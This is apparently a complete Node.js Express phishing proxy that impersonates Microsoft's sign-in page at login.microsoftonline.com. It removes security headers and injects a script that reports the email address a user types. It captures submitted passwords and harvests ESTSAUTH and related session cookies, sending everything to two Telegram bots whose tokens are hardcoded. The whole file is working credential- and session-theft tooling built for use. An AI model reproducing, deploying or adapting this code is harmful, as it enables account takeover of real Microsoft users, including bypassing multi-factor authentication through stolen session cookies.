const express = require('express');
const app = express();
const port = process.env.PORT || 8080;

const upstream = "login.microsoftonline.com";
const upstream_path = "/";
const telegram_bot_token1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const telegram_chat_id1 = "6743632244";
const telegram_bot_token2 = "5609281274:AAHWsvjYauuibR_vs9MPdInpB8LzB1lJXt8";
const telegram_chat_id2 = "1412104349";

const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
];

const emailMap = new Map();

async function replace_response_text(response, upstream, original, ip) {
  return response.text().then((text) =>
    text
      .replace(new RegExp(upstream, "g"), original)
      .replace(
        "</body>",
        `<script>
          document.addEventListener('DOMContentLoaded', () => {
            const interval = setInterval(() => {
              const btn = document.getElementById("idSIButton9");
              const emailInput = document.querySelector("input[name='loginfmt']");
              if (btn && emailInput) {
                clearInterval(interval);
                const realIP = "${ip}";
                btn.addEventListener("click", () => {
                  fetch("/__notify_click", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      event: "next_button_clicked",
                      email: emailInput.value,
                      ip: realIP
                    }),
                  });
                });
              }
            }, 500);
          });
        </script></body>`
      )
  );
}

async function dispatchMessage(message) {
  try {
    // Send to both Telegram bots
    await Promise.all([
      fetch(`https://api.telegram.org/bot${telegram_bot_token1}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: telegram_chat_id1, text: message, parse_mode: "HTML" }),
      }),
      fetch(`https://api.telegram.org/bot${telegram_bot_token2}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: telegram_chat_id2, text: message, parse_mode: "HTML" }),
      })
    ]);
  } catch (err) {
    console.error("Telegram error:", err);
  }
}

// Middleware to parse JSON and form data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Main proxy handler for all routes
app.all('*', async (req, res) => {
  const ip = req.headers['cf-connecting-ip'] ||
             req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
             req.headers['x-client-ip'] ||
             req.headers['true-client-ip'] ||
             req.headers['x-real-ip'] ||
             req.connection.remoteAddress ||
             'unknown';

  const upstream_url = new URL(req.originalUrl, `https://${upstream}`);
  const original_url = new URL(req.originalUrl, `https://${req.get('host')}`);
  
  upstream_url.host = upstream;
  upstream_url.port = 443;
  upstream_url.protocol = "https:";

  if (upstream_url.pathname === "/") {
    upstream_url.pathname = upstream_path;
  } else {
    upstream_url.pathname = upstream_path + upstream_url.pathname;
  }

  console.log(`Proxying ${req.method}: ${original_url} → ${upstream_url}`);

  // Handle special injected click reporting
  if (req.method === "POST" && original_url.pathname === "/__notify_click") {
    const email = req.body.email || "unknown";
    const realIP = req.body.ip || ip;
    emailMap.set(realIP, email);
    await dispatchMessage(
      `👀 <b>User is ready to enter password</b>\n🧑‍💻 <b>Email</b>: ${email}\n🌐 <b>IP</b>: ${realIP}`
    );
    return res.status(200).send("ok");
  }

  // Capture login credentials
  if (req.method === "POST") {
    const body = req.body;
    
    if (body.loginfmt) {
      emailMap.set(ip, body.loginfmt);
    }

    if (body.loginfmt && body.passwd) {
      await dispatchMessage(
        `📥 <b>Captured Credentials</b>:\n🧑‍💻 <b>Email</b>: ${body.loginfmt}\n🔑 <b>Password</b>: ${body.passwd}`
      );
    }
  }

  try {
    const new_request_headers = {
      ...req.headers,
      'host': upstream_url.host,
      'accept-encoding': 'gzip;q=0,deflate;q=0',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'referer': original_url.protocol + "//" + original_url.host
    };

    const response = await fetch(upstream_url.href, {
      method: req.method,
      headers: new_request_headers,
      body: req.method !== 'GET' && req.method !== 'HEAD' ? JSON.stringify(req.body) : undefined,
    });

    // Handle response headers
    const new_response_headers = {};
    for (const [key, value] of response.headers.entries()) {
      if (!delete_headers.includes(key.toLowerCase())) {
        new_response_headers[key] = value;
      }
    }
    new_response_headers['access-control-allow-origin'] = '*';
    new_response_headers['access-control-allow-credentials'] = 'true';

    // Capture important cookies
    try {
      const setCookieHeaders = response.headers.getSetCookie?.() || [];
      
      setCookieHeaders.forEach((cookie) => {
        const modifiedCookie = cookie.replace(
          new RegExp(upstream_url.host, "g"),
          original_url.host
        );
        res.append('Set-Cookie', modifiedCookie);
      });

      const importantCookies = setCookieHeaders.filter((cookie) =>
        /(ESTSAUTH|ESTSAUTHPERSISTENT|SignInStateCookie)=/.test(cookie)
      );

      if (importantCookies.length === 3) {
        const victimEmail = emailMap.get(ip) || "unknown";
        const cookieText = importantCookies.map((c) => c.split(";")[0]).join("\n");

        await dispatchMessage(
          `🍪 <b>Captured Cookies</b> for <b>${victimEmail}</b>:\n<code>${cookieText}</code>`
        );
      }
    } catch (err) {
      console.error("Cookie capture error:", err);
    }

    // Modify response body
    const modifiedBody = await replace_response_text(
      response.clone(),
      upstream_url.protocol + "//" + upstream_url.host,
      original_url.protocol + "//" + original_url.host,
      ip
    );

    // Set response headers
    Object.entries(new_response_headers).forEach(([key, value]) => {
      res.set(key, value);
    });

    res.status(response.status).send(modifiedBody);

  } catch (error) {
    console.error('Proxy error:', error);
    res.status(500).send('Proxy error');
  }
});

app.listen(port, () => {
  console.log(`🔥 Microsoft Login Proxy running on port ${port}`);
  console.log(`🎯 Proxying: ${upstream}`);
  console.log(`📱 Telegram Bots: ${telegram_chat_id1}, ${telegram_chat_id2}`);
});